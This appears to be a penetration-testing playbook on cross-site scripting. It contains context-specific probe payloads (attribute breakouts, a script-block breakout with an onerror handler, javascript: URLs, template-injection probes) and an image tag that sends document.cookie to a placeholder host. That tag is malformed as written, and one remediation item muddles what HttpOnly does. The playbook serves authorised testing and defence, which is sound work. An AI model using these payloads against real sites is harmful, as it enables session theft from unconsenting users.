# Playbook - Cross-Site Scripting

| Field | Value |
|---|---|
| `playbook_id` | PB-WEB-XSS |
| `cwe_id` | CWE-79 |
| `owasp_top10` | A03:2021 |
| `owasp_controls` | DOM-1, DOM-2, DOM-3, INPUT-7 |
| `payload_corpus` | `02-payloads/web/xss/` |
| `detections` | `06-defense/sigma/ssa_web_xss_probe.yml`, CSP report ingestion |

## 1. Reflection analysis

```
value reflected in HTML body      -> text context   -> <,>,",'
value reflected in attribute      -> attribute ctx  -> ", ', <space
value reflected in <script>       -> script ctx     -> </script><
value reflected in JS string     -> js string      -> ', \, newline
value reflected in URL            -> url ctx        -> javascript:, data:
value reflected in DOM via JS     -> DOM ctx        -> innerHTML sink
value reflected in fetch() header -> header ctx     -> CRLF
```

## 2. Context matrix (see `02-payloads/web/xss/payloads.json`)

| Context | Minimal probe | Encoding notes |
|---|---|---|
| HTML text | `<b>x</b>` | entity-encode `<` `>` |
| Attribute (double) | `" onmouseover=alert(1) x="` | entity-encode `"` |
| Attribute (single) | `' onmouseover=alert(1) x='` | entity-encode `'` |
| Script block | `</script><img src=x onerror=alert(1)>` | do not entity-encode |
| JS string | `'-alert(1)-'` | `\u0027` |
| URL | `javascript:alert(1)` | encode `:` |
| Template | `{{7*7}}` then `${7*7}` | SSTI, see `ssti/` |

## 3. Cookie / session impact ladder

1. **Reflected** - victim must be lured; no persistence.
2. **Stored** - persists for every reader, including admins; highest impact.
3. **DOM** - client-side only; bypasses server WAF entirely; found by source review.
4. **Mutation XSS** - payload survives sanitiser but re-parses dangerously.

## 4. Non-invasive proof

Preferred in production: use an out-of-band domain you control and a callback
image, or `document.title` exfiltration. Never use `alert()` on a client
system you do not own.

```html
<img src="https://COLLAB/x?c="+document.cookie>
```

## 5. Remediation

1. Context-aware output encoding (OWASP DOM-1/2/3) - encode at the sink.
2. Sanitise with an allow-list HTML sanitiser for rich content.
3. CSP with nonces, no `unsafe-inline` (OWASP DOM-4).
4. `HttpOnly` + `Secure` + `SameSite` cookies (OWASP SESSION-4).
5. Mark sessions `HttpOnly` so a stolen DOM token cannot be replayed directly.
